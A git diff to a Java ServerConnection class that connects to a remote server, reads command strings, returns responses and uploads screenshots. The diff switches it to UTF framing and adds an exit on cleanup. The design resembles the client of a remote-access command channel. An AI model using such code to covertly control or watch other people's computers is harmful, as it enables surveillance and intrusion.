@@ -6,33 +6,33 @@ import java.util.logging.Level;
 import java.util.logging.Logger;
 
 public class ServerConnection {
-
+    
     private final String serverIp;
     private final int serverPort;
     private Socket socket;
-    private BufferedReader in;
-    private PrintWriter out;
+    private DataInputStream textIn;
     private DataOutputStream dataOut;
     private static final Logger logger = Logger.getLogger(ServerConnection.class.getName());
+    private static final int SOCKET_TIMEOUT = 60000;
+    //private static final int CONNECTION_TIMEOUT = 5000;
 
     public ServerConnection(String serverIp, int serverPort) {
         this.serverIp = serverIp;
         this.serverPort = serverPort;
     }
-
+    
     public synchronized void connect() throws IOException {
         try {
             System.out.println("[-] Connecting to server...");
             socket = new Socket();
-            socket.connect(new InetSocketAddress(serverIp, serverPort), 5000);
-            socket.setSoTimeout(60000);
+            socket.connect(new InetSocketAddress(serverIp, serverPort));
+            socket.setSoTimeout(SOCKET_TIMEOUT);
             System.out.println("[-*] Connected to server: " + serverIp + ":" + serverPort);
-            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-            out = new PrintWriter(socket.getOutputStream(), true);
+            textIn = new DataInputStream(socket.getInputStream());
             dataOut = new DataOutputStream(socket.getOutputStream());
-        } catch (SocketTimeoutException e) {
-            logger.log(Level.SEVERE, "Connection timed out: {0}", e.getMessage());
-            throw new IOException("Connection timed out", e);
+            //} catch (SocketTimeoutException e) {
+            //logger.log(Level.SEVERE, "Connection timed out: {0}", e.getMessage());
+            //throw new IOException("Connection timed out", e);
         } catch (UnknownHostException e) {
             logger.log(Level.SEVERE, "Unknown host: {0}", e.getMessage());
             throw new IOException("Unknown host: " + e.getMessage(), e);
@@ -41,30 +41,34 @@ public class ServerConnection {
             throw e;
         }
     }
-
+    
     public String readCommand() throws IOException {
-        String command = in.readLine();
+        String command = textIn.readUTF();
         if (command == null) {
             throw new IOException("Server connection closed unexpectedly.");
         }
         return command;
     }
-
+    
     public void sendResponse(String response) {
-        if (out != null) {
-            out.println(response);
-            out.flush();
-        } else {
-            logger.warning("Attempted to send response while output stream is closed.");
+        try {
+            if (dataOut != null) {
+                dataOut.writeUTF(response);
+                dataOut.flush();
+            } else {
+                logger.warning("Attempted to send response while output stream is closed.");
+            }
+        } catch (IOException ex) {
+            logger.log(Level.SEVERE, "Failed to send response", ex);
         }
     }
-
+    
     public void sendScreenShot(byte[] imageBytes) {
         try {
             if (imageBytes != null && imageBytes.length > 0) {
-                System.out.println("[DEBUG] Sending screenshot of size: " + imageBytes.length + " bytes");
                 sendResponse("screenshot");
                 dataOut.writeInt(imageBytes.length);
+                dataOut.flush();
                 dataOut.write(imageBytes);
                 dataOut.flush();
             } else {
@@ -75,14 +79,11 @@ public class ServerConnection {
             logger.log(Level.SEVERE, "Failed to send screenshot", ex);
         }
     }
-
+    
     public synchronized void cleanup() {
         try {
-            if (in != null) {
-                in.close();
-            }
-            if (out != null) {
-                out.close();
+            if (textIn != null) {
+                textIn.close();
             }
             if (dataOut != null) {
                 dataOut.close();
@@ -90,6 +91,8 @@ public class ServerConnection {
             if (socket != null) {
                 socket.close();
             }
+            System.out.println("[*] Resources cleaned up successfully.");
+            System.exit(0);
         } catch (IOException e) {
             logger.log(Level.SEVERE, "Error closing resources: " + e.getMessage(), e);
         }
